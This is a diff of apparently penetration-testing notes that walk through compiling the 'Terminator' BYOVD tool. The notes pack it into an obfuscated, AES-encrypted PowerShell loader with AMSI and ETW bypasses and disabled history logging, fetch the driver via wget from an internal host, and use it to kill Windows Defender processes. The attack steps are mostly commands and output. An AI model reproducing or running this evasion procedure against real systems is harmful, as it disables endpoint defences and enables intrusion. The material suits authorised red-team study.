@@ -1,5 +1,5 @@
 ================================================================================================================================
-Killing anti-malware protected processes using the tool 'Terminator'
+Killing AV/EDR protected processes using the tool 'Terminator' (BYOVD technique)
 ================================================================================================================================
 
 Source: https://github.com/ZeroMemoryEx/Terminator
@@ -41,6 +41,21 @@ PoC / Simple example - Killing the Defender AV processes on a Windows server 201
 Step 1 - Download the code from GitHub, compile it and then use a packer to be able to run the tool without being detected by AVs
 -----------------------------------------------------------------------------------------------------------------------------------------
 
+Visual Studio logs
+-------------------
+
+Build started...
+1>------ Build All started: Project: Terminator, Configuration: Release x64 ------
+1>Terminator.cpp
+1>Generating code
+1>Previous IPDB not found, fall back to full compilation.
+1>All 9 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
+1>Finished generating code
+1>Terminator.vcxproj -> C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\Terminator.exe
+B========== Nuild All: 1 succeeded, 0 failed, 0 skipped ==========
+========== Build started at 10:48 PM and took 01.355 seconds ==========
+
+
 PS C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release> dir
 
     Directory: C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release
@@ -74,21 +89,21 @@ Features:
 [*] Basic sandbox evasion techniques (optional -sandbox)
 
 
-PS C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release> Invoke-PoSH-PePacker -FilePath  C:\Users\j-cana\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\Terminator.exe -OutFile  C:\Users\j-cana\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\packed-terminator.ps1
-[*] Loading the PE file: 'C:\Users\j-cana\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\Terminator.exe
+PS C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release> Invoke-PoSH-PePacker -FilePath  C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\Terminator.exe -OutFile  C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\packed-terminator.ps1
+[*] Loading the PE file: 'C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\Terminator.exe
 [*] Creating the reflective PE file injection script
 [*] File compression (GZip/Deflate)
 [*] File encryption (AES)
 [*] Adding 'A'M'S'I' bypass
 [*] Adding 'E'T'W' bypass
 [*] Disabling PoSh history logging
-[*] The obfuscated & encrypted PE file loader script has been saved: 'C:\Users\j-cana\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\packed-terminator.ps1' ...
+[*] The obfuscated & encrypted PE file loader script has been saved: 'C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release\packed-terminator.ps1' ...
 [+] Done!
 
 
 PS C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release> dir
 
-    Directory: C:\Users\j-cana\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release
+    Directory: C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Terminator-master\x64\Release
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
@@ -129,7 +144,7 @@ PS C:\temp > wget -URI http://192.168.1.50:8000/Terminator.sys -OutFile Terminat
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
-Step 3 - Run the tool 'Termintaor' with local admin priv and kill the Windows Defender AV processes 
+Step 3 - Run the packed version of the tool 'Terminator' with local admin privileges and kill the Windows Defender AV processes 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\Users\Administrator> ps
